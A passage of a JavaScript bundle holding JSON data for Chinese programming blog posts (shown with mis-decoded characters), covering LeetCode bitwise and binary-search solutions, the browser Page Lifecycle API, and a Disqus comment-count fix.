n\\nç¬¬äºŒæ¬¡ç¢°è§æŸä¸ªæ•°nï¼š   n   0\\nç¬¬ä¸‰æ¬¡ç¢°è§æŸä¸ªæ•°nï¼š   0   0</code></pre></code></pre><p>3.æœ‰ä¸Šé¢çœ‹å‡ºï¼Œa,båˆå§‹å€¼ä¸º0ï¼Œ</p>\\n<p>bçš„1,2æ­¥å¾ˆç®€å•ï¼Œç›´æ¥ <code>n ^ b</code>ä¸¤æ¬¡ï¼Œä½†ç¬¬ä¸‰æ­¥éœ€è¦å¤„ç†ä¸€ä¸ªé¢å¤–çš„æ•°ï¼Œ</p>\\n<p>aä¹Ÿå¯ä»¥å…ˆå¼‚æˆ–ï¼Œå†å¤„ç†ä¸€ä¸ªæ•°ï¼Œ</p>\\n<p>æˆ‘ä»¬å…ˆæ‰‹åŠ¨æ·»åŠ è¿™ä¸ªæ•°ï¼Œä¸ºäº†è®©å®ƒä»¬æ‰“åˆ°çŠ¶æ€å€¼</p>\\n<p>bç¬¬ä¸€æ­¥ï¼š<code>(b ^ n) &amp; n    ----&gt; n</code></p>\\n<p>bç¬¬äºŒæ­¥ï¼š<code>(b ^ n) &amp; any(n)  ----&gt; 0</code></p>\\n<p>bç¬¬ä¸‰æ­¥ï¼š<code>(b ^ n) &amp; 0    ----&gt; 0</code></p>\\n<p>å†çœ‹açš„ä¸‰æ­¥ï¼š</p>\\n<p>aç¬¬ä¸€æ­¥ï¼š<code>(a ^ n) &amp; 0  ----&gt; 0</code></p>\\n<p>aç¬¬äºŒæ­¥ï¼š<code>(a ^ n) &amp; n  ----&gt; n</code></p>\\n<p>aç¬¬ä¸‰æ­¥ï¼š<code>(a ^ n) &amp; any(n)  ----&gt; 0</code></p>\\n<p>è¿™é‡Œ<code>any</code>å¯ä»¥è¡¨ç¤ºä»»ä½•æ•°ï¼Œä¸ºäº†æ–¹ä¾¿æˆ‘ä»¬ç”¨<code>n</code>å»ä»£æ›¿(åé¢çš„æ‹¬å·)</p>\\n<p>ä½†è¿™æ ·åé¢é‚£ä¸ªæ•°æ²¡æœ‰å›ºå®šï¼Œå°±ä¸èƒ½ä½¿ç”¨è¿­ä»£ï¼Œéœ€è¦é€‰æ‹©ä¸€ä¸ªå˜é‡(ä¼šè‡ªåŠ¨å˜åŒ–çš„)</p>\\n<p>4.çœ‹çœ‹bçš„è¾“å‡ºå€¼ï¼Œ<code>n,0,0</code>ï¼Œçœ‹çœ‹açš„éœ€è¦çš„å€¼<code>0,n,n</code> ï¼Œè¿™å°±å¯ä»¥å†™ä¸€ä¸ªè½¬æ¢å‡½æ•°</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> cov=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">x,n</span>)=&gt;</span>x===<span class=\\"hljs-number\\">0</span>?n:<span class=\\"hljs-number\\">0</span> </code></pre></code></pre>\\n<p>å› æ­¤åˆå¹¶èµ·æ¥å¯ä»¥å†™æˆï¼š</p>\\n<p>bç¬¬ä¸€æ­¥ï¼š<code>(b ^ n) &amp; n    ----&gt; n</code></p>\\n<p>aç¬¬ä¸€æ­¥ï¼š<code>(a ^ n) &amp; cov(b,n)  ----&gt; 0</code></p>\\n<p>bç¬¬äºŒæ­¥ï¼š<code>(b ^ n) &amp; n  ----&gt; 0</code></p>\\n<p>aç¬¬äºŒæ­¥ï¼š<code>(a ^ n) &amp; cov(b,n)  ----&gt; n</code></p>\\n<p>bç¬¬ä¸‰æ­¥ï¼š<code>(b ^ n) &amp; 0    ----&gt; 0</code></p>\\n<p>aç¬¬ä¸‰æ­¥ï¼š<code>(a ^ n) &amp; cov(b,n)  ----&gt; 0</code></p>\\n<p>å†çœ‹bçš„éœ€è¦çš„å€¼<code>n,n,0</code>ï¼Œaçš„åˆå§‹å€¼å’Œå‰2æ­¥çš„è¾“å‡ºå€¼æ˜¯<code>0,0,n</code>ï¼Œå¾ˆä¸Šé¢ä¸€æ ·ï¼Œ</p>\\n<p>bç¬¬ä¸€æ­¥ï¼š<code>(b ^ n) &amp; cov(a,n)  ----&gt; n</code></p>\\n<p>aç¬¬ä¸€æ­¥ï¼š<code>(a ^ n) &amp; cov(b,n)  ----&gt; 0</code></p>\\n<p>bç¬¬äºŒæ­¥ï¼š<code>(b ^ n) &amp; cov(a,n)  ----&gt; 0</code></p>\\n<p>aç¬¬äºŒæ­¥ï¼š<code>(a ^ n) &amp; cov(b,n)  ----&gt; n</code></p>\\n<p>bç¬¬ä¸‰æ­¥ï¼š<code>(b ^ n) &amp; cov(a,n)  ----&gt; 0</code></p>\\n<p>aç¬¬ä¸‰æ­¥ï¼š<code>(a ^ n) &amp; cov(b,n)  ----&gt; 0</code></p>\\n<p>5.ä¸Šé¢åªæ˜¯å®ç°è¿ç»­æ•°å­—ï¼Œ<code>[5,5,5,4]</code>è¿™ç§</p>\\n<p>ä½†å®é™…ä¸Šå¾€å¾€æ˜¯è¿™æ ·çš„ï¼š<code>[5,4,5,5]</code></p>\\n<p>é‚£ä¹ˆ<code>cov()</code>æ˜¯éœ€è¦å†™æˆ<code>~</code>ï¼Œå› ä¸º<code>n &amp; ~n</code>ä¸€å®šä¸º0ï¼Œ<code>n &amp; ~0</code>ä¸€å®šä¸ºnï¼Œå› æ­¤æœ€ç»ˆä¸ºï¼š</p>\\n<p>bç¬¬ä¸€æ­¥ï¼š<code>(b ^ n) &amp; ~a  ----&gt; n</code></p>\\n<p>aç¬¬ä¸€æ­¥ï¼š<code>(a ^ n) &amp; ~b  ----&gt; 0</code></p>\\n<p>bç¬¬äºŒæ­¥ï¼š<code>(b ^ n) &amp; ~a  ----&gt; 0</code></p>\\n<p>aç¬¬äºŒæ­¥ï¼š<code>(a ^ n) &amp; ~b  ----&gt; n</code></p>\\n<p>bç¬¬ä¸‰æ­¥ï¼š<code>(b ^ n) &amp; ~a  ----&gt; 0</code></p>\\n<p>aç¬¬ä¸‰æ­¥ï¼š<code>(a ^ n) &amp; ~b  ----&gt; 0</code></p>\\n<p>éƒ½æ˜¯ä¸€æ ·çš„å…¬å¼ï¼Œè¿­ä»£å°±è¡Œ</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">let</span> a=<span class=\\"hljs-number\\">0</span>,b=<span class=\\"hljs-number\\">0</span>\\n<span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> n <span class=\\"hljs-keyword\\">of</span> arr){\\n  b=(b ^ n) &amp; ~a \\n  a=(a ^ n) &amp; ~b\\n}</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-05","timeArr":[2018,9,5,0,0,0,0],"title":"è®°å½•ä¸€é“LeetCode ä½æ“ä½œç¬¦è®¡ç®—å•ä¸ªæ•°å­—æ–¹æ³•","uuid":"df98df497745a7628226928d1110b2baad0c50cb","summary":"<p><a href=\\"https://leetcode.com/problems/single-number-ii/description/\\">åŸé¢˜ç›®ï¼š</a>\\n<code>LeetCode</code>çš„ä¸€ä¸ªé¢˜ç›®ï¼Œè¦æ±‚ç®—å‡ºæ•°ç»„ä¸­å•ç‹¬å‡ºç°çš„æ•°å­—</p>\\n<pre class=\\"hljs\\"><code>Given a non-empty array of integers, every element appear...</code></pre>","slug":"ji-lu-yi-dao-LeetCode-wei-cao-zuo-fu-ji-suan-dan-ge-shu-zi-fang-fa","sha":"6a99838485b9fda6b8a6b0e9d892100d68d0a27c"}')},612:function(n){n.exports=JSON.parse('{"content":"<p>é¢˜ç›®ä½ç½®ï¼š<a href=\\"https://leetcode.com/problems/nth-magical-number/description/\\">https://leetcode.com/problems/nth-magical-number/description/</a></p>\\n<h5 id=\\"ti-mu\\">é¢˜ç›®</h5>\\n<p>å¦‚æœæ­£æ•´æ•° å¯è¢«A  æˆ–Bæ•´é™¤ï¼Œåˆ™å®ƒæ˜¯ç¥å¥‡çš„ã€‚</p>\\n<p>è¿”å›ç¬¬Nä¸ªé­”æ³•æ•°å­—ã€‚ç”±äºç­”æ¡ˆå¯èƒ½éå¸¸å¤§ï¼Œå› æ­¤è¿”å›å€¼éœ€è¦æ¨¡(%)10^9 + 7ã€‚</p>\\n<p>ä¾‹1ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>è¾“å…¥ï¼š N = 1ï¼ŒA = 2ï¼ŒB = 3\\nè¾“å‡ºï¼š2</code></pre></code></pre><p>ä¾‹2ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>è¾“å…¥ï¼š N = 4ï¼ŒA = 2ï¼ŒB = 3\\nè¾“å‡ºï¼š6</code></pre></code></pre><p>ä¾‹3ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>è¾“å…¥ï¼š N = 5ï¼ŒA = 2ï¼ŒB = 4\\nè¾“å‡ºï¼š10</code></pre></code></pre><p>ä¾‹4ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>è¾“å…¥ï¼š N = 3ï¼ŒA = 6ï¼ŒB = 4\\nè¾“å‡ºï¼š8</code></pre></code></pre><hr>\\n<h5 id=\\"yao-dian-ï¼›\\">è¦ç‚¹ï¼›</h5>\\n<ol>\\n<li><p>å¦‚æœçŸ¥é“åœ¨Næ¬¡å†…ï¼Œaå‡ºç°çš„æ¬¡æ•°iï¼Œbå‡ºç°çš„æ¬¡æ•°jï¼Œé‚£ä¹ˆå°±å¯ä»¥é€šè¿‡Math.max(a<em>i,b</em>j)æ±‚å‡ºç»“æœ</p>\\n<pre><code><pre class=\\"hljs\\"><code> ä¾‹å¦‚: Nä¸º5, aä¸º3, bä¸º4\\n å¦‚æœæˆ‘ä»¬çŸ¥é“aå‡ºç°äº†3æ¬¡ï¼Œbå‡ºç°äº†2æ¬¡ï¼Œé‚£ä¹ˆå°±å¯ç®—å‡º 9</code></pre></code></pre></li>\\n<li><p>Næ˜¯ç”±aå‡ºç°çš„æ¬¡æ•°iï¼Œbå‡ºç°çš„æ¬¡æ•°jï¼Œå’Œä»–ä»¬æœ€å°å…¬å€æ•°å‡ºç°çš„æ¬¡æ•°kè®¡ç®—è€Œå¾—(N=i+j-k)</p>\\n<pre><code><pre class=\\"hljs\\"><code> ä¾‹å¦‚ Nä¸º5, aä¸º2, bä¸º3\\n aå‡ºç°4æ¬¡ï¼Œbå‡ºç°2æ¬¡ï¼Œæœ€å°å…¬å€æ•°å‡ºç°1æ¬¡ï¼Œé‚£ä¹ˆN=4+2-1</code></pre></code></pre></li>\\n<li><p>å‡è®¾æŸä¸ªæ•°xï¼Œaå‡ºç°çš„æ¬¡æ•°æ˜¯Math.floor(x/a)ï¼Œbå‡ºç°çš„æ¬¡æ•°æ˜¯Math.floor(x/b)ï¼Œæœ€å°å…¬å€æ•°å‡ºç°çš„æ¬¡æ•°æ˜¯Math.floor(x/lcm)ï¼Œå› æ­¤æˆ‘ä»¬è¦æ‰¾å‡ºè¿™ä¸ªæ•°ï¼Œä½¿å¾—i+j-k===N</p>\\n</li>\\n</ol>\\n<hr>\\n<h5 id=\\"zui-da-gong-yue-shu--lowest-common-multiple\\">æœ€å¤§å…¬çº¦æ•° Lowest Common Multiple</h5>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">GCD</span>(<span class=\\"hljs-params\\">a,b</span>)</span>{\\n    <span class=\\"hljs-keyword\\">while</span>(a % b!==<span class=\\"hljs-number\\">0</span>){\\n        <span class=\\"hljs-keyword\\">let</span> temp=a\\n        a=b;\\n        b=temp % b\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> b\\n}</code></pre></code></pre>\\n<h5 id=\\"zui-xiao-gong-bei-shu--greatest-common-divisor\\">æœ€å°å…¬å€æ•° greatest common divisor</h5>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">LCM</span>(<span class=\\"hljs-params\\">a,b</span>)</span>{\\n    <span class=\\"hljs-keyword\\">return</span> a*b/GCD(a,b)\\n}</code></pre></code></pre>\\n<hr>\\n<h5 id=\\"wan-zheng-dai-ma\\">å®Œæ•´ä»£ç </h5>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">/**\\n * <span class=\\"hljs-doctag\\">@param <span class=\\"hljs-type\\">{number}</span> <span class=\\"hljs-variable\\">N</span></span>\\n * <span class=\\"hljs-doctag\\">@param <span class=\\"hljs-type\\">{number}</span> <span class=\\"hljs-variable\\">A</span></span>\\n * <span class=\\"hljs-doctag\\">@param <span class=\\"hljs-type\\">{number}</span> <span class=\\"hljs-variable\\">B</span></span>\\n * <span class=\\"hljs-doctag\\">@return <span class=\\"hljs-type\\">{number}</span></span>\\n */</span>\\n<span class=\\"hljs-keyword\\">var</span> nthMagicalNumber = <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span>(<span class=\\"hljs-params\\">N, A, B</span>) </span>{\\n    <span class=\\"hljs-keyword\\">let</span> lo=<span class=\\"hljs-number\\">0</span>,hi=<span class=\\"hljs-built_in\\">Number</span>.MAX_SAFE_INTEGER,m=<span class=\\"hljs-number\\">0</span>;\\n    <span class=\\"hljs-keyword\\">let</span> aCount,bCount;\\n    <span class=\\"hljs-keyword\\">while</span>(lo&lt;hi){\\n        <span class=\\"hljs-keyword\\">let</span> mid=<span class=\\"hljs-built_in\\">Math</span>.floor((lo+hi)/<span class=\\"hljs-number\\">2</span>);\\n        aCount=<span class=\\"hljs-built_in\\">Math</span>.floor(mid/A);\\n        bCount=<span class=\\"hljs-built_in\\">Math</span>.floor(mid/B);\\n        <span class=\\"hljs-keyword\\">let</span> LCMCount=<span class=\\"hljs-built_in\\">Math</span>.floor(mid/LCM(A,B));\\n        m=aCount+bCount-LCMCount;\\n        <span class=\\"hljs-keyword\\">if</span>(m===N)<span class=\\"hljs-keyword\\">break</span>;\\n        <span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span>(m&gt;N)hi=mid;\\n        <span class=\\"hljs-keyword\\">else</span> lo=mid+<span class=\\"hljs-number\\">1</span>;\\n    }\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">GCD</span>(<span class=\\"hljs-params\\">a,b</span>)</span>{\\n        <span class=\\"hljs-keyword\\">while</span>(a % b!==<span class=\\"hljs-number\\">0</span>){\\n            <span class=\\"hljs-keyword\\">let</span> temp=a;\\n            a=b;\\n            b=temp % b\\n        }\\n        <span class=\\"hljs-keyword\\">return</span> b\\n    }\\n    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">LCM</span>(<span class=\\"hljs-params\\">a,b</span>)</span>{\\n        <span class=\\"hljs-keyword\\">return</span> a*b/GCD(a,b)\\n    }\\n    <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-built_in\\">Math</span>.max(A*aCount,B*bCount) % <span class=\\"hljs-number\\">1000000007</span>\\n};</code></pre></code></pre>\\n","toc":[{"anchor":"ti-mu","level":5,"text":"é¢˜ç›®"},{"anchor":"yao-dian-ï¼›","level":5,"text":"è¦ç‚¹ï¼›"},{"anchor":"zui-da-gong-yue-shu--lowest-common-multiple","level":5,"text":"æœ€å¤§å…¬çº¦æ•° Lowest Common Multiple"},{"anchor":"zui-xiao-gong-bei-shu--greatest-common-divisor","level":5,"text":"æœ€å°å…¬å€æ•° greatest common divisor"},{"anchor":"wan-zheng-dai-ma","level":5,"text":"å®Œæ•´ä»£ç "}],"relatedTags":null,"created_at":"2018-07-29","timeArr":[2018,6,29,0,0,0,0],"title":"è®°ä¸€é“äºŒåˆ†æŸ¥æ‰¾ç®—æ³•é¢˜","uuid":"00c5d9ed2847e38150e59f8030c9eff752b313f7","summary":"<p>é¢˜ç›®ä½ç½®ï¼šhttps://leetcode.com/problems/nth-magical-number/description/</p>\\n<h5>é¢˜ç›®ï¼š</h5>\\n<p>å¦‚æœæ­£æ•´æ•° å¯è¢«A  æˆ–Bæ•´é™¤ï¼Œåˆ™å®ƒæ˜¯ç¥å¥‡çš„ã€‚</p>\\n<p>è¿”å›ç¬¬Nä¸ªé­”æ³•æ•°å­—ã€‚ç”±äºç­”æ¡ˆå¯èƒ½éå¸¸å¤§ï¼Œå› æ­¤è¿”å›å€¼éœ€è¦æ¨¡(%)10^9 + 7ã€‚</p>\\n<p>ä¾‹1ï¼š</p>\\n<pre class=\\"hljs\\"><code>è¾“å…¥ï¼š N ...</code></pre>","slug":"ji-yi-dao-er-fen-cha-zhao-suan-fa-ti","sha":"dfdf8e089072d006549cc430c7b7973cc851fcbb"}')},613:function(n){n.exports=JSON.parse('{"content":"<h4 id=\\"jian-ting-wang-ye-du-qu-zhuang-kuang-shi-yong\\">ç›‘å¬ç½‘é¡µè¯»å–çŠ¶å†µä½¿ç”¨</h4>\\n<p><code>DOMContentLoaded</code>å’Œ<code>window.onload</code></p>\\n<p>ç›‘å¬ç½‘é¡µå±•ç¤ºçŠ¶å†µï¼Œå¯ä»¥è°ƒç”¨ä¸€ç³»åˆ—<code>Page LIfecycle</code>API</p>\\n<h4 id=\\"sheng-ming-zhou-qi\\">ç”Ÿå‘½å‘¨æœŸ</h4>\\n<p><img src=\\"https://raw.githubusercontent.com/WICG/page-lifecycle/master/LifecycleStates.png\\" alt=\\"\\"></p>\\n<ul>\\n<li><code>Active</code>ï¼šç½‘é¡µå¯è§å¹¶ä¸”æ¥å—è¾“å…¥ï¼Œä¾‹å¦‚æ»šåŠ¨ï¼Œé”®å…¥å­—ç¬¦</li>\\n<li><code>Passive</code>ï¼šç½‘é¡µå¯è§å¹¶ä¸”ä¸æ¥å—è¾“å…¥ï¼ŒUIæ‰§è¡Œï¼Œä¾‹å¦‚æ­£åœ¨consoleå¹³å°é”®å…¥</li>\\n<li><code>Hidden</code>ï¼šç½‘é¡µä¸å¯è§ï¼ŒUIä¸æ‰§è¡Œ</li>\\n<li><code>Terminated</code>ï¼šç”¨æˆ·ä¸»åŠ¨å…³é—­é¡µé¢ï¼Œä¹Ÿæœ‰å¯èƒ½ä»FrozençŠ¶æ€ç›´æ¥ç»“æŸã€‚</li>\\n<li><code>Frozen</code>ï¼šç”¨æˆ·æœªå…³é—­é¡µé¢ï¼Œé¡µé¢é•¿æ—¶é—´æœªä½¿ç”¨è¢«å†»ç»“ï¼Œç½‘é¡µä¸ä¼šå†è¢«åˆ†é… CPU è®¡ç®—èµ„æº(å°éƒ¨åˆ†ä»»åŠ¡ç»§ç»­è¿è¡Œ)ã€‚</li>\\n<li><code>Discarded</code>ï¼šç½‘é¡µé•¿æ—¶é—´å†»ç»“ï¼Œå¸è½½ç½‘é¡µï¼Œæ¸…é™¤å ç”¨å†…å­˜ï¼Œå†æ¬¡è¿›å…¥ä¼šé‡æ–°åŠ è½½ã€‚(å½“tabè¿‡å¤šï¼Œå®¹æ˜“å‡ºç°è¿™ç§æƒ…å†µ)</li>\\n</ul>\\n<h4 id=\\"shi-jian\\">äº‹ä»¶</h4>\\n<ul>\\n<li><p>focus </p>\\n</li>\\n<li><p>blur</p>\\n</li>\\n<li><p>visibilitychange : å½“é¡µé¢å¯è§çŠ¶æ€å‘ç”Ÿå˜åŒ–ï¼Œä¾‹å¦‚ï¼Œæœ€å°åŒ–ï¼Œåˆ‡æ¢tabï¼Œå…³é—­tabç­‰</p>\\n</li>\\n<li><p>freeze : chrome 68æ–°å¢ï¼Œå½“é¡µé¢è½¬ä¸º<code>Frozen</code>æ—¶è§¦å‘ã€‚</p>\\n</li>\\n<li><p>resume : chrome 68æ–°å¢ï¼Œå½“é¡µé¢ç¦»å¼€<code>Frozen</code>å¹¶ä¸”ä¸æ˜¯å…³é—­æ—¶è§¦å‘ã€‚</p>\\n</li>\\n<li><p>pageshow </p>\\n<blockquote>\\n<p><code>pageshow</code>äº‹ä»¶åœ¨ç”¨æˆ·åŠ è½½ç½‘é¡µæ—¶è§¦å‘ã€‚è¿™æ—¶ï¼Œæœ‰å¯èƒ½æ˜¯å…¨æ–°çš„é¡µé¢åŠ è½½ï¼Œä¹Ÿå¯èƒ½æ˜¯ä»ç¼“å­˜ä¸­è·å–çš„é¡µé¢ã€‚\\n  å¦‚æœæ˜¯ä»ç¼“å­˜ä¸­è·å–ï¼Œåˆ™è¯¥äº‹ä»¶å¯¹è±¡çš„<code>event.persisted</code>å±æ€§ä¸ºtrueï¼Œå¦åˆ™ä¸ºfalseã€‚</p>\\n</blockquote>\\n<blockquote>\\n<p>è¿™ä¸ªäº‹ä»¶çš„åå­—æœ‰ç‚¹è¯¯å¯¼ï¼Œå®ƒè·Ÿé¡µé¢çš„å¯è§æ€§å…¶å®æ¯«æ— å…³ç³»ï¼Œåªè·Ÿæµè§ˆå™¨çš„ History è®°å½•çš„å˜åŒ–æœ‰å…³ã€‚</p>\\n</blockquote>\\n</li>\\n<li><p>pagehide</p>\\n<blockquote>\\n<p><code>pagehide</code>äº‹ä»¶åœ¨ç”¨æˆ·ç¦»å¼€å½“å‰ç½‘é¡µã€è¿›å…¥å¦ä¸€ä¸ªç½‘é¡µæ—¶è§¦å‘ã€‚å®ƒçš„å‰ææ˜¯æµè§ˆå™¨çš„ History è®°å½•å¿…é¡»å‘ç”Ÿå˜åŒ–ï¼Œè·Ÿç½‘é¡µæ˜¯å¦å¯è§æ— å…³ã€‚</p>\\n</blockquote>\\n<blockquote>\\n<p>å¦‚æœæµè§ˆå™¨èƒ½å¤Ÿå°†å½“å‰é¡µé¢æ·»åŠ åˆ°ç¼“å­˜ä»¥ä¾›ç¨åé‡ç”¨ï¼Œåˆ™äº‹ä»¶å¯¹è±¡çš„<code>event.persisted</code>å±æ€§ä¸ºtrueã€‚ å¦‚æœä¸ºtrueã€‚å¦‚æœé¡µé¢æ·»åŠ åˆ°äº†ç¼“å­˜ï¼Œåˆ™é¡µé¢è¿›å…¥ Frozen çŠ¶æ€ï¼Œå¦åˆ™è¿›å…¥ Terminatied çŠ¶æ€ã€‚</p>\\n</blockquote>\\n</li>\\n<li><p>unload</p>\\n</li>\\n<li><p>beforeunload : é€šè¿‡è®¾ç½®<code>event.returnValue</code>åœ¨é€€å‡ºç½‘é¡µæ—¶æç¤ºã€‚</p>\\n</li>\\n</ul>\\n<h4 id=\\"shu-xing\\">å±æ€§</h4>\\n<p><code>document.visibilityState</code>ï¼šè·å–å½“å‰é¡µé¢å¯è§çŠ¶æ€<code>visible</code>,<code>hidden</code>ã€‚\\n<code>document.wasDiscarded</code>ï¼šåˆ¤æ–­ç½‘é¡µæ˜¯å¦ç»è¿‡<code>Discarded</code>é˜¶æ®µã€‚</p>\\n<hr>\\n<p>demo:<a href=\\"https://page-lifecycle.glitch.me/\\">https://page-lifecycle.glitch.me/</a></p>\\n<p>å‚è€ƒï¼š</p>\\n<ul>\\n<li><a href=\\"http://www.ruanyifeng.com/blog/2018/11/page_lifecycle_api.html\\">Page Lifecycle API æ•™ç¨‹</a></li>\\n<li><a href=\\"https://github.com/WICG/page-lifecycle\\">page lifecycle</a></li>\\n</ul>\\n","toc":[{"anchor":"jian-ting-wang-ye-du-qu-zhuang-kuang-shi-yong","level":4,"text":"ç›‘å¬ç½‘é¡µè¯»å–çŠ¶å†µä½¿ç”¨"},{"anchor":"sheng-ming-zhou-qi","level":4,"text":"ç”Ÿå‘½å‘¨æœŸ"},{"anchor":"shi-jian","level":4,"text":"äº‹ä»¶"},{"anchor":"shu-xing","level":4,"text":"å±æ€§"}],"relatedTags":null,"created_at":"2018-11-07","timeArr":[2018,10,7,0,0,0,0],"title":"ç›‘æ§ç½‘é¡µçŠ¶æ€çš„-Page Lifecycle","uuid":"dc88a14e3350748449cfa7bae96179c2301f3548","summary":"<h4>ç›‘å¬ç½‘é¡µè¯»å–çŠ¶å†µä½¿ç”¨</h4>\\n<p><code>DOMContentLoaded</code>å’Œ<code>window.onload</code></p>\\n<p>ç›‘å¬ç½‘é¡µå±•ç¤ºçŠ¶å†µï¼Œå¯ä»¥è°ƒç”¨ä¸€ç³»åˆ—<code>Page LIfecycle</code>API</p>\\n<h4>ç”Ÿå‘½å‘¨æœŸï¼š</h4>\\n<p>![](https://raw.githubusercontent.com/WICG/page-lifecycle/m...</p>","slug":"jian-kong-wang-ye-zhuang-tai-de-Page-Lifecycle","sha":"ce6d06466d2502c0c7cc081e44839f05bad8e8b0"}')},614:function(n){n.exports=JSON.parse('{"content":"<p>åšå®¢æ·»åŠ äº†<code>disqus</code>ï¼Œå¹¶ä¸”åœ¨æ–‡ç« åˆ—è¡¨å¤„æ¯ä¸€ç¯‡æ ‡é¢˜è¾¹ä¸Šæ·»åŠ ä¸€ä¸ªè¯„è®ºè®¡æ•°å™¨ã€‚</p>\\n<p>å®ƒé€šè¿‡<code>identifier</code>å»è·å–ï¼Œ<code>identifier</code>åœ¨æ–‡ç« è¯¦æƒ…é¡µé¢æä¾›é…ç½®ã€‚</p>\\n<p>é—®é¢˜æ˜¯ï¼š<strong>è¿™ä¸ªè®¡æ•°å™¨å¹¶ä¸æ˜¯æ¯ä¸€ç¯‡æ–‡ç« éƒ½èƒ½æ­£ç¡®æ˜¾ç¤º</strong>ï¼Œæœ‰çš„åˆ—è¡¨èƒ½æ˜¾ç¤º2ä¸ªï¼Œæœ‰çš„åˆ—è¡¨ä¸€ä¸ªéƒ½ä¸æ˜¾ç¤ºï¼Œ</p>\\n<p><img src=\\"/article/img/comment_count_fail.png\\" alt=\\"\\"></p>\\n<p>çœ‹äº†çœ‹networkï¼Œä¸èƒ½æ˜¾ç¤ºçš„æ–‡ç« responseæ˜¯ä¸ªç©ºæ•°ç»„ï¼Œæ˜¯ä¸æ˜¯æœåŠ¡å™¨è·å–å¤±è´¥å‘¢è¿˜æ˜¯æ²¡æœ‰ä¸Šä¼ åˆ°æœåŠ¡å™¨å‘¢ã€‚</p>\\n<p>ç¬¬ä¸€æ¬¡å°è¯•ï¼Œå°†è®¡æ•°å™¨è·å–çš„é…ç½®<code>identifier</code>æ”¹æˆä¸€ä¸ªé™æ€çš„å¹¶ä¸”æœ‰æ•ˆçš„(å·²ç»èƒ½è·å–åˆ°çš„)ï¼Œ\\nç»“æœèƒ½æ˜¾ç¤ºï¼Œè¯´æ˜è·å–è®¡æ•°å€¼è¿™ä¸ªè°ƒç”¨(æˆ–è€…è¯´è¿™ä¸ªå†™æ³•)æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚</p>\\n<p>ç¬¬äºŒæ¬¡å°è¯•ï¼Œå°†é…ç½®<code>identifier</code>æ”¹å›åŠ¨æ€ã€‚åœ¨<code>https://disqus.com/api/console/</code>è¿›è¡Œè°ƒè¯•</p>\\n<p>é€‰æ‹©<code>thread</code>ä¸‹æ–¹çš„<code>list</code>ï¼Œè®¾å®š<code>froum</code>ä¸ºä½ çš„<code>shortname</code>ï¼Œ\\nå¦‚æœä½ çš„æ•°é‡è¶…è¿‡25ï¼Œéœ€è¦è®¾ç½®<code>limit</code>ï¼Œæˆ‘è¿™é‡Œè®¾ç½®äº†<code>limit</code>ä¸º100</p>\\n<p><img src=\\"/article/img/disqus_concole.png\\" alt=\\"\\"></p>\\n<p>å°†ç»“æœcopyåˆ°æ§åˆ¶å°ä¸Šä¸€çœ‹ï¼Œæ‰47æ¡ï¼Œæˆ‘è¿™é‡Œæ–‡ç« èµ·ç 90ç¯‡ï¼Œæ‰¾åˆ°åŸå› äº†ï¼ŒåŸæ¥æ˜¯æœåŠ¡å™¨å¹¶æœªæ¥æ”¶åˆ°è®¸å¤šæ–‡ç« çš„<code>identifier</code></p>\\n<p><img src=\\"/article/img/disque_request_first.png\\" alt=\\"\\"></p>\\n<p>é‚£ä¹ˆå‘ç”Ÿè¿™ç§é—®é¢˜çš„åŸå› å’Œé—®é¢˜è¯¥å¦‚ä½•è§£å†³å‘¢ï¼Ÿ</p>\\n<p>åŸå› åº”è¯¥æ˜¯ï¼Œ</p>\\n<ol>\\n<li><p>å…·ä½“çš„<code>identifier</code>é…ç½®å¸è½½æ¨¡å—å†…éƒ¨ï¼Œå¦‚æœä¸å»åŠ è½½æ¨¡å—ï¼Œé‚£ä¹ˆå®ƒå˜æ— æ³•æ‰§è¡Œã€‚</p>\\n</li>\\n<li><p>æˆ‘çš„æ–‡ç« éƒ½æ˜¯<code>lazy-load</code>æˆ–è®¸ä¹Ÿæœ‰é€ æˆè¿™ç§é—®é¢˜çš„å› ç´ ã€‚</p>\\n</li>\\n</ol>\\n<p>é‚£ä¹ˆè§£å†³æ–¹æ³•ï¼Œæˆ‘ä¹Ÿæ˜¯ç”¨ä¸€ä¸ªç¬¨æ–¹æ³•ï¼Œå†™äº†ä¸€ä¸ª<code>setInterval</code>ï¼Œæ¯ä¸ªå‡ ç§’è®©å®ƒè·³è½¬ä¸‹ä¸€ç¯‡æ–‡ç« ï¼Œå…¨éƒ¨è®©å®ƒé…ç½®ä¸€æ¬¡ï¼Œ\\nå¤§çº¦5åˆ†é’Ÿåï¼Œå†æ¬¡<code>request</code>å</p>\\n<p>æ•°é‡å·²ç»è¾¾åˆ°æ­£å¸¸çš„98</p>\\n<p><img src=\\"/article/img/disque_request_second.png\\" alt=\\"\\"></p>\\n<p>è¿‡äº†å‡ åˆ†é’Ÿï¼Œå¼ºåˆ¶åˆ·æ–°åï¼Œå†æ¬¡æŸ¥çœ‹ï¼Œå…¨éƒ¨æ­£å¸¸æ˜¾ç¤ºï¼</p>\\n<p><img src=\\"/article/img/comment_count_succ.png\\" 